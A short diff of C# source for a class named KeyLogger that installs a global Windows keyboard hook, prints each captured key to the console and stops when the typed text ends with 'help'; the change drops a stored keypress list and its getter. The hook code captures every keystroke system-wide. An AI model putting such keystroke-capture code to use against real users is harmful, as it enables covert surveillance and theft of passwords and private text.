@@ -6,7 +6,6 @@ using System.Windows.Forms;
 public class KeyLogger {
     private static IntPtr hookId = IntPtr.Zero;
     private static LowLevelKeyboardProc proc = HookCallback;
-    private static List<string> keyPresses = new List<string>();
     private static string currentInput = "";
 
     public static void Start() {
@@ -17,10 +16,6 @@ public class KeyLogger {
 
     public static void Stop() {
         Application.Exit();
-    }
-
-    public static string[] GetKeyPresses() {
-        return keyPresses.ToArray();
     }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc) {
@@ -36,13 +31,11 @@ public class KeyLogger {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
             string key = ((Keys)vkCode).ToString();
-            Console.WriteLine(key);
-            keyPresses.Add(key);
+            Console.WriteLine(key +" : " + currentInput.Length);
             currentInput += key.ToLower();
             if (currentInput.EndsWith("help")) {
                 Stop();
             }
-            Console.WriteLine(keyPresses.Count);
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
